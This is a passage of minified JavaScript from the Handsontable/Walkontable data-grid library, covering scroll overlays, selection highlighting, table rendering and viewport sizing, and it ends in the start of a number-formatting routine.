n=Math.ceil(t.top);e.style.left="0";if(n<0){e.style.top=-n+"px"}else{e.style.top="0"}}else{e.style.top=this.getScrollPosition()+"px";e.style.left="0"}if(this.instance.wtScrollbars.horizontal.scrollHandler===window){e.style.width=this.instance.wtViewport.getWorkspaceActualWidth()+"px"}else{e.style.width=Handsontable.Dom.outerWidth(this.clone.wtTable.TABLE)+"px"}e.style.height=Handsontable.Dom.outerHeight(this.clone.wtTable.TABLE)+4+"px"};WalkontableVerticalScrollbarNative.prototype.getScrollPosition=function(){return Handsontable.Dom.getScrollTop(this.scrollHandler)};WalkontableVerticalScrollbarNative.prototype.setScrollPosition=function(e){if(this.scrollHandler===window){window.scrollTo(Handsontable.Dom.getWindowScrollLeft(),e)}else{this.scrollHandler.scrollTop=e}};WalkontableVerticalScrollbarNative.prototype.onScroll=function(){this.readSettings();this.instance.draw(true);this.instance.getSetting("onScrollVertically")};WalkontableVerticalScrollbarNative.prototype.getLastCell=function(){return this.instance.getSetting("offsetRow")+this.instance.wtTable.tbodyChildrenLength-1};WalkontableVerticalScrollbarNative.prototype.sumCellSizes=function(e,t){var n=0,r;while(e<t){r=this.instance.wtSettings.settings.rowHeight(e);n+=r!==void 0?r:this.instance.wtSettings.settings.defaultRowHeight;e++}return n};WalkontableVerticalScrollbarNative.prototype.refresh=function(e){this.applyToDOM();WalkontableOverlay.prototype.refresh.call(this,e)};WalkontableVerticalScrollbarNative.prototype.applyToDOM=function(){var e=this.getLastCell();this.measureBefore=this.sumCellSizes(0,this.offset);if(e===-1){this.measureAfter=0}else{this.measureAfter=this.sumCellSizes(e,this.total-e)}var t=this.instance.wtViewport.getColumnHeaderHeight();this.fixedContainer.style.height=t+this.sumCellSizes(0,this.total)+4+"px";this.fixed.style.top=this.measureBefore+"px";this.fixed.style.bottom=""};WalkontableVerticalScrollbarNative.prototype.scrollTo=function(e){var t=this.getTableParentOffset()+e*this.cellSize;this.setScrollPosition(t);this.onScroll()};WalkontableVerticalScrollbarNative.prototype.getTableParentOffset=function(){if(this.scrollHandler===window){return this.instance.wtTable.holderOffset.top}else{return 0}};WalkontableVerticalScrollbarNative.prototype.readSettings=function(){this.offset=this.instance.getSetting("offsetRow");this.total=this.instance.getSetting("totalRows");var e=this.getScrollPosition()-this.getTableParentOffset();var t=0;var n;var r;for(var i=0;i<this.total;i++){r=this.instance.getSetting("rowHeight",i);n=r!==void 0?r:this.instance.wtSettings.settings.defaultRowHeight;t+=n;if(t-1>e){break}}this.offset=Math.min(i,this.total);this.instance.update("offsetRow",this.offset)};WalkontableScrollbars.prototype.registerListeners=function(){function s(){if(!e.instance.drawn){return}if(!e.instance.wtTable.holder.parentNode){e.destroy();return}e.vertical.windowScrollPosition=e.vertical.getScrollPosition();e.horizontal.windowScrollPosition=e.horizontal.getScrollPosition();e.box=e.instance.wtTable.hider.getBoundingClientRect();if(e.vertical.windowScrollPosition!==t||e.horizontal.windowScrollPosition!==n||e.box.top!==r||e.box.left!==i){e.vertical.onScroll();e.horizontal.onScroll();t=e.vertical.windowScrollPosition;n=e.horizontal.windowScrollPosition;r=e.box.top;i=e.box.left}}var e=this;var t,n,r,i;var o=$(window);this.vertical.$scrollHandler.on("scroll."+this.instance.guid,s);if(this.vertical.scrollHandler!==this.horizontal.scrollHandler){this.horizontal.$scrollHandler.on("scroll."+this.instance.guid,s)}if(this.vertical.scrollHandler!==window&&this.horizontal.scrollHandler!==window){o.on("scroll."+this.instance.guid,s)}};WalkontableScrollbars.prototype.destroy=function(){if(this.vertical){this.vertical.destroy();this.vertical.$scrollHandler.off("scroll."+this.instance.guid)}if(this.horizontal){this.horizontal.destroy();this.vertical.$scrollHandler.off("scroll."+this.instance.guid)}$(window).off("scroll."+this.instance.guid);this.corner&&this.corner.destroy();this.debug&&this.debug.destroy()};WalkontableScrollbars.prototype.refresh=function(e){this.horizontal&&this.horizontal.readSettings();this.vertical&&this.vertical.readSettings();this.horizontal&&this.horizontal.refresh(e);this.vertical&&this.vertical.refresh(e);this.corner&&this.corner.refresh(e);this.debug&&this.debug.refresh(e)};WalkontableScrollbars.prototype.applyToDOM=function(){this.horizontal&&this.horizontal.applyToDOM();this.vertical&&this.vertical.applyToDOM()};WalkontableSelection.prototype.getBorder=function(e){if(this.instanceBorders[e.guid]){return this.instanceBorders[e.guid]}this.instanceBorders[e.guid]=new WalkontableBorder(e,this.settings)};WalkontableSelection.prototype.isEmpty=function(){return this.cellRange===null};WalkontableSelection.prototype.add=function(e){if(this.isEmpty()){this.cellRange=new WalkontableCellRange(e,e,e)}else{this.cellRange.expand(e)}};WalkontableSelection.prototype.replace=function(e,t){if(!this.isEmpty()){if(this.cellRange.from.isEqual(e)){this.cellRange.from=t;return true}if(this.cellRange.to.isEqual(e)){this.cellRange.to=t;return true}}return false};WalkontableSelection.prototype.clear=function(){this.cellRange=null};WalkontableSelection.prototype.getCorners=function(){var e=this.cellRange.getTopLeftCorner();var t=this.cellRange.getBottomRightCorner();return[e.row,e.col,t.row,t.col]};WalkontableSelection.prototype.addClassAtCoords=function(e,t,n,r){var i=e.wtTable.getCell(new WalkontableCellCoords(t,n));if(typeof i==="object"){Handsontable.Dom.addClass(i,r)}};WalkontableSelection.prototype.draw=function(e){var t,n,r,i,s,o=e.wtTable.getRowStrategy().countVisible(),u=e.wtTable.getColumnStrategy().cellCount;if(!this.isEmpty()){t=this.getCorners();for(n=0;n<o;n++){i=e.wtTable.rowFilter.visibleToSource(n);for(r=0;r<u;r++){s=e.wtTable.columnFilter.visibleToSource(r);if(i>=t[0]&&i<=t[2]&&s>=t[1]&&s<=t[3]){if(this.settings.className){this.addClassAtCoords(e,i,s,this.settings.className)}if(s===t[1]){var a=e.wtTable.getRowHeader(i);if(a){Handsontable.Dom.addClass(a,this.settings.highlightRowClassName)}}if(i===t[0]||i>t[0]&&n==0){var a=e.wtTable.getColumnHeader(s);if(a){Handsontable.Dom.addClass(a,this.settings.highlightColumnClassName)}}}else if(i>=t[0]&&i<=t[2]){this.addClassAtCoords(e,i,s,this.settings.highlightRowClassName)}else if(s>=t[1]&&s<=t[3]){this.addClassAtCoords(e,i,s,this.settings.highlightColumnClassName)}}}e.getSetting("onBeforeDrawBorders",t,this.settings.className);if(this.settings.border){var f=this.getBorder(e);if(f){f.appear(t)}}}else{if(this.settings.border){var f=this.getBorder(e);if(f){f.disappear()}}}};WalkontableSettings.prototype.update=function(e,t){if(t===void 0){for(var n in e){if(e.hasOwnProperty(n)){this.settings[n]=e[n]}}}else{this.settings[e]=t}return this.instance};WalkontableSettings.prototype.getSetting=function(e,t,n,r,i){if(typeof this.settings[e]==="function"){return this.settings[e](t,n,r,i)}else if(t!==void 0&&Object.prototype.toString.call(this.settings[e])==="[object Array]"){return this.settings[e][t]}else{return this.settings[e]}};WalkontableSettings.prototype.has=function(e){return!!this.settings[e]};WalkontableTable.prototype.getRowStrategy=function(){return this.isWorkingOnClone()?this.instance.cloneSource.wtTable.rowStrategy:this.rowStrategy};WalkontableTable.prototype.getColumnStrategy=function(){return this.isWorkingOnClone()?this.instance.cloneSource.wtTable.columnStrategy:this.columnStrategy};WalkontableTable.prototype.isWorkingOnClone=function(){return!!this.instance.cloneSource};WalkontableTable.prototype.refreshHiderDimensions=function(){var e=this.spreader.style;e.position="relative";e.width="auto";e.height="auto"};WalkontableTable.prototype.draw=function(e){if(!e){if(this.isWorkingOnClone()){this.tableOffset=this.instance.cloneSource.wtTable.tableOffset}else{this.holderOffset=Handsontable.Dom.offset(this.holder);this.tableOffset=Handsontable.Dom.offset(this.TABLE);this.instance.wtScrollbars.vertical.readSettings();this.instance.wtScrollbars.horizontal.readSettings();this.instance.wtViewport.resetSettings()}var t;if(this.instance.cloneOverlay instanceof WalkontableDebugOverlay||this.instance.cloneOverlay instanceof WalkontableVerticalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative){t=0}else{t=this.instance.wtSettings.settings.offsetRow}this.rowFilter=new WalkontableRowFilter(t,this.instance.getSetting("totalRows"),this.instance.getSetting("columnHeaders").length);this.columnFilter=new WalkontableColumnFilter(this.instance.getSetting("totalColumns"),this.instance.getSetting("rowHeaders").length);this._doDraw()}else{this.instance.wtScrollbars&&this.instance.wtScrollbars.refresh(true)}this.refreshPositions(e);if(!this.isWorkingOnClone()){this.instance.wtScrollbars.vertical.resetFixedPosition();this.instance.wtScrollbars.horizontal.resetFixedPosition();this.instance.wtScrollbars.corner.resetFixedPosition();this.instance.wtScrollbars.debug&&this.instance.wtScrollbars.debug.resetFixedPosition()}this.instance.drawn=true;return this};WalkontableTable.prototype._doDraw=function(){var e=new WalkontableTableRenderer(this);e.render()};WalkontableTable.prototype.refreshPositions=function(e){this.refreshHiderDimensions();this.refreshSelections(e)};WalkontableTable.prototype.removeClassFromCells=function(e){var t=this.TABLE.querySelectorAll("."+e);for(var n=0,r=t.length;n<r;n++){Handsontable.Dom.removeClass(t[n],e)}};WalkontableTable.prototype.refreshSelections=function(e){if(this.instance.selections){if(e){for(var t=0,n=this.instance.selections.length;t<n;t++){if(this.instance.selections[t].settings.className){this.removeClassFromCells(this.instance.selections[t].settings.className)}if(this.instance.selections[t].settings.highlightRowClassName){this.removeClassFromCells(this.instance.selections[t].settings.highlightRowClassName)}if(this.instance.selections[t].settings.highlightColumnClassName){this.removeClassFromCells(this.instance.selections[t].settings.highlightColumnClassName)}}}for(var t=0,n=this.instance.selections.length;t<n;t++){this.instance.selections[t].draw(this.instance,e)}}};WalkontableTable.prototype.getCell=function(e){if(this.isRowBeforeViewport(e.row)){return-1}else if(this.isRowAfterViewport(e.row)){return-2}var t=this.TBODY.childNodes[this.rowFilter.sourceToVisible(e.row)];if(t){return t.childNodes[this.columnFilter.sourceColumnToVisibleRowHeadedColumn(e.col)]}};WalkontableTable.prototype.getColumnHeader=function(e){var t=this.THEAD.childNodes[0];if(t){return t.childNodes[this.columnFilter.sourceColumnToVisibleRowHeadedColumn(e)]}};WalkontableTable.prototype.getRowHeader=function(e){if(this.columnFilter.sourceColumnToVisibleRowHeadedColumn(0)==0){return null}var t=this.TBODY.childNodes[this.rowFilter.sourceToVisible(e)];if(t){return t.childNodes[0]}};WalkontableTable.prototype.getCoords=function(e){var t=e.parentNode;var n=Handsontable.Dom.index(t);if(t.parentNode===this.THEAD){n=this.rowFilter.visibleColHeadedRowToSourceRow(n)}else{n=this.rowFilter.visibleToSource(n)}return new WalkontableCellCoords(n,this.columnFilter.visibleRowHeadedColumnToSourceColumn(e.cellIndex))};WalkontableTable.prototype.getTrForRow=function(e){return this.TBODY.childNodes[this.rowFilter.sourceToVisible(e)]};WalkontableTable.prototype.getFirstVisibleRow=function(){return this.rowFilter.visibleToSource(0)};WalkontableTable.prototype.getFirstVisibleColumn=function(){if(this.isWorkingOnClone()){if(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative){return 0}else{return this.instance.cloneSource.wtTable.getFirstVisibleColumn()}}var e=this.instance.wtScrollbars.horizontal.getScrollPosition();var t=this.getColumnStrategy().cellCount;var n=this.TBODY.firstChild;if(!n){return 0}for(var r=0;r<t;r++){e-=n.childNodes[r].offsetWidth;if(e<0){return r}}return-1};WalkontableTable.prototype.getLastVisibleRow=function(){var e=this.rowFilter.visibleToSource(this.getRowStrategy().countVisible()-1);var t=this.instance;if(t.cloneOverlay instanceof WalkontableVerticalScrollbarNative||t.cloneOverlay instanceof WalkontableCornerScrollbarNative){var n=this.instance.getSetting("fixedRowsTop");return Math.min(n-1,e)}else{return e}};WalkontableTable.prototype.getLastVisibleColumn=function(){var e=this.instance;if(this.isWorkingOnClone()){if(e.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||e.cloneOverlay instanceof WalkontableCornerScrollbarNative){var t=this.getColumnStrategy().countVisible()-1;var n=e.getSetting("fixedColumnsLeft");return Math.min(n-1,t)}else{return this.instance.cloneSource.wtTable.getLastVisibleColumn()}}var r=this.instance.wtScrollbars.horizontal.getScrollPosition();var i=r+this.instance.wtViewport.getWorkspaceWidth(Infinity);var s=this.getColumnStrategy().cellCount;var o=this.instance.getSetting("rowHeaders").length||0;var u=this.TBODY.firstChild;if(!s){return-1}for(var a=0;a<s+o;a++){i-=u.childNodes[a].offsetWidth;if(i<=0){return a-o}}return a-o-1};WalkontableTable.prototype.isRowBeforeViewport=function(e){return this.rowFilter.sourceToVisible(e)<0&&e>=0};WalkontableTable.prototype.isRowAfterViewport=function(e){return e>this.getLastVisibleRow()};WalkontableTable.prototype.isColumnBeforeViewport=function(e){return this.columnFilter.sourceToVisible(e)<0&&e>=0};WalkontableTable.prototype.isColumnAfterViewport=function(e){return e>this.getLastVisibleColumn()};WalkontableTable.prototype.isRowInViewport=function(e){return!this.isRowBeforeViewport(e)&&!this.isRowAfterViewport(e)};WalkontableTable.prototype.isColumnInViewport=function(e){return!this.isColumnBeforeViewport(e)&&!this.isColumnAfterViewport(e)};WalkontableTable.prototype.isLastRowFullyVisible=function(){return this.getLastVisibleRow()===this.instance.getSetting("totalRows")-1&&!this.getRowStrategy().isLastIncomplete()};WalkontableTable.prototype.isLastColumnFullyVisible=function(){return this.getLastVisibleColumn()===this.instance.getSetting("totalColumns")-1&&!this.getColumnStrategy().isLastIncomplete()};WalkontableTable.prototype.getVisibleRowsCount=function(){return this.getRowStrategy().countVisible()};WalkontableTable.prototype.allRowsInViewport=function(){return this.getRowStrategy().cellCount==this.getVisibleRowsCount()};WalkontableTableRenderer.prototype.render=function(){if(!this.wtTable.isWorkingOnClone()){this.instance.getSetting("beforeDraw",true)}this.rowHeaders=this.instance.getSetting("rowHeaders");this.rowHeaderCount=this.rowHeaders.length;this.fixedRowsTop=this.instance.getSetting("fixedRowsTop");this.columnHeaders=this.instance.getSetting("columnHeaders");this.columnHeaderCount=this.columnHeaders.length;var e,t=this.instance.getSetting("totalRows"),n=this.instance.getSetting("totalColumns"),r,i=false,s;if(n>0){var o;if(this.wtTable.isWorkingOnClone()){if(this.instance.cloneOverlay instanceof WalkontableVerticalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative){o=this.fixedRowsTop}else if(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative){o=this.wtTable.getRowStrategy().cellCount}}this.adjustAvailableNodes();i=true;this.renderColGroups();this.renderColumnHeaders();r=this.getColumnCount();this.renderRows(t,o,r);if(!this.wtTable.isWorkingOnClone()){s=this.instance.wtViewport.getWorkspaceWidth();this.instance.wtViewport.containerWidth=null;this.wtTable.getColumnStrategy().stretch()}this.adjustColumnWidths(r)}if(!i){this.adjustAvailableNodes()}if(!(this.instance.cloneOverlay instanceof WalkontableDebugOverlay)){this.removeRedundantRows()}if(!this.wtTable.isWorkingOnClone()){this.markOversizedRows();this.instance.wtScrollbars.applyToDOM();if(s!==this.instance.wtViewport.getWorkspaceWidth()){this.instance.wtViewport.containerWidth=null;this.wtTable.getColumnStrategy().stretch();var u=this.instance.wtTable.columnWidthCache;for(e=0;e<this.wtTable.getColumnStrategy().cellCount;e++){var a=this.wtTable.getColumnStrategy().getSize(e);this.COLGROUP.childNodes[e+this.rowHeaderCount].style.width=a+"px";u[e]=a}}this.instance.wtScrollbars.refresh(false);this.instance.getSetting("onDraw",true)}};WalkontableTableRenderer.prototype.removeRedundantRows=function(){var e=this.wtTable.getRowStrategy().countRendered();while(this.wtTable.tbodyChildrenLength>e){this.TBODY.removeChild(this.TBODY.lastChild);this.wtTable.tbodyChildrenLength--}};WalkontableTableRenderer.prototype.renderRows=function(e,t,n){var r,i,s;var o=this.instance.getSetting("offsetRow");var u=0;var a=this.rowFilter.visibleToSource(u);var f=this.wtTable.isWorkingOnClone();while(a<e&&a>=0){if(u>1e3){throw new Error("Security brake: Too much TRs. Please define height for your table, which will enforce scrollbars.")}if(t!==void 0&&u===t){break}i=this.getOrCreateTrForRow(u,i);this.renderRowHeaders(a,i);this.adjustColumns(i,n+this.rowHeaderCount);r=this.renderCells(a,i,n);o=this.instance.getSetting("offsetRow");if(!f){s=this.wtTable.getRowStrategy().add(u,r);if(s===false){break}this.resetOversizedRow(a)}if(i.firstChild){var l=this.instance.getSetting("rowHeight",a);if(l){i.firstChild.style.height=l+"px"}else{i.firstChild.style.height=""}}u++;a=this.rowFilter.visibleToSource(u)}};WalkontableTableRenderer.prototype.resetOversizedRow=function(e){if(this.instance.wtTable.oversizedRows&&this.instance.wtTable.oversizedRows[e]){this.instance.wtTable.oversizedRows[e]=void 0}};WalkontableTableRenderer.prototype.markOversizedRows=function(){var e,t,n,r;var i=this.instance.wtTable.TBODY.childNodes.length;while(i){i--;n=this.instance.wtTable.rowFilter.visibleToSource(i);e=this.instance.wtSettings.settings.rowHeight(n);r=this.instance.wtTable.getTrForRow(n);t=Handsontable.Dom.innerHeight(r)-1;if(!e&&this.instance.wtSettings.settings.defaultRowHeight<t||e<t){if(!this.instance.wtTable.oversizedRows){this.instance.wtTable.oversizedRows={}}this.instance.wtTable.oversizedRows[n]=t}}};WalkontableTableRenderer.prototype.renderCells=function(e,t,n){var r,i;for(var s=0;s<n;s++){i=this.columnFilter.visibleToSource(s);if(s===0){r=t.childNodes[this.columnFilter.sourceColumnToVisibleRowHeadedColumn(i)]}else{r=r.nextSibling}if(r.nodeName=="TH"){r=this.utils.replaceThWithTd(r,t)}if(!Handsontable.Dom.hasClass(r,"hide")){r.className=""}r.removeAttribute("style");this.instance.getSetting("cellRenderer",e,i,r)}return r};WalkontableTableRenderer.prototype.adjustColumnWidths=function(e){var t=this.instance.wtTable.columnWidthCache;var n=false;var r;for(var i=0;i<e;i++){if(this.wtTable.isWorkingOnClone()){r=this.instance.cloneSource.wtTable.columnWidthCache[i]}else{r=this.wtTable.getColumnStrategy().getSize(i)}if(r!==t[i]){this.COLGROUP.childNodes[i+this.rowHeaderCount].style.width=r+"px";t[i]=r;n=true}}};WalkontableTableRenderer.prototype.appendToTbody=function(e){this.TBODY.appendChild(e);this.wtTable.tbodyChildrenLength++};WalkontableTableRenderer.prototype.getOrCreateTrForRow=function(e,t){var n;if(e>=this.wtTable.tbodyChildrenLength){n=this.createRow();this.appendToTbody(n)}else if(e===0){n=this.TBODY.firstChild}else{n=t.nextSibling}return n};WalkontableTableRenderer.prototype.createRow=function(){var e=document.createElement("TR");for(var t=0;t<this.rowHeaderCount;t++){e.appendChild(document.createElement("TH"))}return e};WalkontableTableRenderer.prototype.renderRowHeader=function(e,t,n){n.className="";n.removeAttribute("style");this.rowHeaders[t](e,n,t)};WalkontableTableRenderer.prototype.renderRowHeaders=function(e,t){for(var n=t.firstChild,r=0;r<this.rowHeaderCount;r++){if(!n){n=document.createElement("TH");t.appendChild(n)}else if(n.nodeName=="TD"){n=this.utils.replaceTdWithTh(n,t)}this.renderRowHeader(e,r,n);n=n.nextSibling}};WalkontableTableRenderer.prototype.adjustAvailableNodes=function(){this.refreshStretching();this.adjustColGroups();this.adjustThead()};WalkontableTableRenderer.prototype.renderColumnHeaders=function(){if(!this.columnHeaderCount){return}var e=this.getColumnCount(),t;for(var n=0;n<this.columnHeaderCount;n++){t=this.getTrForColumnHeaders(n);for(var r=-1*this.rowHeaderCount;r<e;r++){this.renderColumnHeader(n,r,t.childNodes[r+this.rowHeaderCount])}}};WalkontableTableRenderer.prototype.adjustColGroups=function(){var e=this.getColumnCount();while(this.wtTable.colgroupChildrenLength<e+this.rowHeaderCount){this.COLGROUP.appendChild(document.createElement("COL"));this.wtTable.colgroupChildrenLength++}while(this.wtTable.colgroupChildrenLength>e+this.rowHeaderCount){this.COLGROUP.removeChild(this.COLGROUP.lastChild);this.wtTable.colgroupChildrenLength--;if(this.wtTable.columnWidthCache){this.wtTable.columnWidthCache.splice(-1,1)}}};WalkontableTableRenderer.prototype.adjustThead=function(){var e=this.getColumnCount();var t=this.THEAD.firstChild;if(this.columnHeaders.length){for(var n=0,r=this.columnHeaders.length;n<r;n++){t=this.THEAD.childNodes[n];if(!t){t=document.createElement("TR");this.THEAD.appendChild(t)}this.theadChildrenLength=t.childNodes.length;while(this.theadChildrenLength<e+this.rowHeaderCount){t.appendChild(document.createElement("TH"));this.theadChildrenLength++}while(this.theadChildrenLength>e+this.rowHeaderCount){t.removeChild(t.lastChild);this.theadChildrenLength--}}var i=this.THEAD.childNodes.length;if(i>this.columnHeaders.length){for(var n=this.columnHeaders.length;n<i;n++){this.THEAD.removeChild(this.THEAD.lastChild)}}}else if(t){Handsontable.Dom.empty(t)}};WalkontableTableRenderer.prototype.getTrForColumnHeaders=function(e){var t=this.THEAD.childNodes[e];return t};WalkontableTableRenderer.prototype.renderColumnHeader=function(e,t,n){n.className="";n.removeAttribute("style");return this.columnHeaders[e](t,n,e)};WalkontableTableRenderer.prototype.getColumnCount=function(){if(this.wtTable.isWorkingOnClone()&&(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative)){return this.instance.getSetting("fixedColumnsLeft")}else{return this.wtTable.getColumnStrategy().cellCount}};WalkontableTableRenderer.prototype.renderColGroups=function(){for(var e=0;e<this.wtTable.colgroupChildrenLength;e++){if(e<this.rowHeaderCount){Handsontable.Dom.addClass(this.COLGROUP.childNodes[e],"rowHeader")}else{Handsontable.Dom.removeClass(this.COLGROUP.childNodes[e],"rowHeader")}}};WalkontableTableRenderer.prototype.adjustColumns=function(e,t){var n=e.childNodes.length;while(n<t){var r=document.createElement("TD");e.appendChild(r);n++}while(n>t){e.removeChild(e.lastChild);n--}};WalkontableTableRenderer.prototype.refreshStretching=function(){if(this.wtTable.isWorkingOnClone()){return}var e=this.instance,t=e.getSetting("stretchH"),n=e.getSetting("totalRows"),r=e.getSetting("totalColumns");var i=function(e){var t=s.instance.wtViewport.getViewportWidth(e);return t};var s=this;var o=function(t){var n=s.columnFilter.visibleToSource(t);if(n<r){return e.getSetting("columnWidth",n)}};var u=function(t){if(s.instance.cloneOverlay instanceof WalkontableDebugOverlay||e.wtSettings.settings.renderAllRows){return Infinity}else{return s.instance.wtViewport.getViewportHeight(t)}};var a=function(t,n){return e.wtSettings.settings.defaultRowHeight};this.wtTable.columnStrategy=new WalkontableColumnStrategy(e,i,o,t);this.wtTable.rowStrategy=new WalkontableRowStrategy(e,u,a)};WalkontableTableRenderer.utils={};WalkontableTableRenderer.utils.replaceTdWithTh=function(e,t){var n;n=document.createElement("TH");t.insertBefore(n,e);t.removeChild(e);return n};WalkontableTableRenderer.utils.replaceThWithTd=function(e,t){var n=document.createElement("TD");t.insertBefore(n,e);t.removeChild(e);return n};WalkontableViewport.prototype.getWorkspaceHeight=function(){var e=this.instance.wtScrollbars.vertical.scrollHandler;if(e===window){return document.documentElement.clientHeight}else{var t=Handsontable.Dom.outerHeight(e);var n=t>0&&e.clientHeight>0?e.clientHeight:Infinity;return n}};WalkontableViewport.prototype.getWorkspaceWidth=function(){var e=Math.min(this.getContainerFillWidth(),document.documentElement.offsetWidth-this.getWorkspaceOffset().left,document.documentElement.offsetWidth);var t=this.instance.wtScrollbars.horizontal.scrollHandler;if(t!=window){var n=this.instance.wtScrollbars.horizontal.scrollHandler.style.overflow;if(n=="scroll"||n=="hidden"||n=="auto"){return Math.max(e,t.clientWidth)}}return Math.max(e,Handsontable.Dom.outerWidth(this.instance.wtTable.TABLE))};WalkontableViewport.prototype.getContainerFillWidth=function(){if(this.containerWidth){return this.containerWidth}var e=this.instance.wtTable.holder,t,n;while(e.parentNode!=document.body&&e.parentNode!=null&&e.className.indexOf("handsontable")===-1){e=e.parentNode}n=document.createElement("DIV");n.style.width="100%";n.style.height="1px";e.appendChild(n);t=n.offsetWidth;this.containerWidth=t;e.removeChild(n);return t};WalkontableViewport.prototype.getWorkspaceOffset=function(){return Handsontable.Dom.offset(this.instance.wtTable.TABLE)};WalkontableViewport.prototype.getWorkspaceActualHeight=function(){return Handsontable.Dom.outerHeight(this.instance.wtTable.TABLE)};WalkontableViewport.prototype.getWorkspaceActualWidth=function(){return Handsontable.Dom.outerWidth(this.instance.wtTable.TABLE)||Handsontable.Dom.outerWidth(this.instance.wtTable.TBODY)||Handsontable.Dom.outerWidth(this.instance.wtTable.THEAD)};WalkontableViewport.prototype.getColumnHeaderHeight=function(){if(isNaN(this.columnHeaderHeight)){this.columnHeaderHeight=Handsontable.Dom.outerHeight(this.instance.wtTable.THEAD)}return this.columnHeaderHeight};WalkontableViewport.prototype.getViewportHeight=function(e){var t=this.getWorkspaceHeight(e);if(t===Infinity){return t}var n=this.getColumnHeaderHeight();if(n>0){t-=n}return t};WalkontableViewport.prototype.getRowHeaderWidth=function(){if(this.instance.cloneSource){return this.instance.cloneSource.wtViewport.getRowHeaderWidth()}if(isNaN(this.rowHeaderWidth)){var e=this.instance.getSetting("rowHeaders");if(e.length){var t=this.instance.wtTable.TABLE.querySelector("TH");this.rowHeaderWidth=0;for(var n=0,r=e.length;n<r;n++){if(t){this.rowHeaderWidth+=Handsontable.Dom.outerWidth(t);t=t.nextSibling}else{this.rowHeaderWidth+=50}}}else{this.rowHeaderWidth=0}}return this.rowHeaderWidth};WalkontableViewport.prototype.getViewportWidth=function(e){var t=this.getWorkspaceWidth(e);if(t===Infinity){return t}var n=this.getRowHeaderWidth();if(n>0){return t-n}else{return t}};WalkontableViewport.prototype.resetSettings=function(){this.rowHeaderWidth=NaN;this.columnHeaderHeight=NaN}})(jQuery,window,Handsontable);(function(){function u(e){this._value=e}function a(e,t,n,r){var i=Math.pow(10,t),s,o;o=(n(e*i)/i).toFixed(t);if(r){s=new RegExp("0{1,"+r+"}$");o=o.replace(s,"")}return o}function f(e,t,n){var r;if(t.indexOf("$")>-1){r=c(e,t,n)}else if(t.indexOf("%")>-1){r=h(e,t,n)}else if(t.indexOf(":")>-1){r=p(e,t)}else{r=v(e._value,t,n)}return r}function l(e,t){var s=t,o,u,a,f,l=["KB","MB","GB","TB","PB","EB","ZB","YB"],c=false,h;if(t.indexOf(":")>-1){e._value=d(t)}else{if(t===i){e._value=0}else{if(n[r].delimiters.decimal!=="."){t=t.replace(/\./g,"").replace(n[r].delimiters.decimal,".")}o=new RegExp("[^a-zA-Z]"+n[r].abbreviations.thousand+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$");u=new RegExp("[^a-zA-Z]"+n[r].abbreviations.million+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$");a=new RegExp("[^a-zA-Z]"+n[r].abbreviations.billion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$");f=new RegExp("[^a-zA-Z]"+n[r].abbreviations.trillion+"(?:\\)|(\\"+n[r].currency.symbol+")?(?:\\))?)?$");for(h=0;h<=l.length;h++){c=t.indexOf(l[h])>-1?Math.pow(1024,h+1):false;if(c){break}}e._value=(c?c:1)*(s.match(o)?Math.pow(10,3):1)*(s.match(u)?Math.pow(10,6):1)*(s.match(a)?Math.pow(10,9):1)*(s.match(f)?Math.pow(10,12):1)*(t.indexOf("%")>-1?.01:1)*((t.split("-").length+Math.min(t.split("(").length-1,t.split(")").length-1))%2?1:-1)*Number(t.replace(/[^0-9\.]+/g,""));e._value=c?Math.ceil(e._value):e._value}}return e._value}function c(e,t,i){var s=t.indexOf("$"),o=t.indexOf("("),u=t.indexOf("-"),a="",f,l;if(t.indexOf(" $")>-1){a=" ";t=t.replace(" $","")}else if(t.indexOf("$ ")>-1){a=" ";t=t.replace("$ ","")}else{t=t.replace("$","")}l=v(e._value,t,i);if(s<=1){if(l.indexOf("(")>-1||l.indexOf("-")>-1){l=l.split("");f=1;if(s<o||s<u){f=0}l.splice(f,0,n[r].currency.symbol+a);l=l.join("")}else{l=n[r].currency.symbol+a+l}}else{if(l.indexOf(")")>-1){l=l.split("");l.splice(-1,0,a+n[r].currency.symbol);l=l.join("")}else{l=l+a+n[r].currency.symbol}}return l}function h(e,t,n){var r="",i,s=e._value*100;if(t.indexOf(" %")>-1){r=" ";t=t.replace(" %","")}else{t=t.replace("%","")}i=v(s,t,n);if(i.indexOf(")")>-1){i=i.split("");i.splice(-1,0,r+"%");i=i.join("")}else{i=i+r+"%"}return i}function p(e){var t=Math.floor(e._value/60/60),n=Math.floor((e._value-t*60*60)/60),r=Math.round(e._value-t*60*60-n*60);return t+":"+(n<10?"0"+n:n)+":"+(r<10?"0"+r:r)}function d(e){var t=e.split(":"),n=0;if(t.length===3){n=n+Number(t[0])*60*60;n=n+Number(t[1])*60;n=n+Number(t[2])}else if(t.length===2){n=n+Number(t[0])*60;n=n+Number(t[1])}return Number(n)}function v(e,t,s){var o=false,u=false,f=false,l="",c=false,h=false,p=false,d=false,v=false,m="",g="",y=Math.abs(e),b=["B","KB","MB","GB","TB","PB","EB","ZB","YB"],w,E,S,x,T,N,C="",k=false;if(e===0&&i!==null){return i}else{if(t.indexOf("(")>-1){o=true;t=t.slice(1,-1)}else if(t.indexOf("+")>-1){u=true;t=t.replace(/\+/g,"")}if(t.indexOf("a")>-1){c=t.indexOf("aK")>=0;h=t.indexOf("aM")>=0;p=t.indexOf("aB")>=0;d=t.indexOf("aT")>=0;v=c||h||p||d;if(t.indexOf(" a")>-1){l=" ";t=t.replace(" a","")}else{t=t.replace("a","")}if(y>=Math.pow(10,12)&&!v||d){l=l+n[r].abbreviations.trillion;e=e/Math.pow(10,12)}else if(y<Math.pow(10,12)&&y>=Math.pow(10,9)&&!v||p){l=l+n[r].abbreviations.billion;e=e/Math.pow(10,9)}else if(y<Math.pow(10,9)&&y>=Math.pow(10,6)&&!v||h){l=l+n[r].abbreviations.million;e=e/Math.pow(10,6)}else 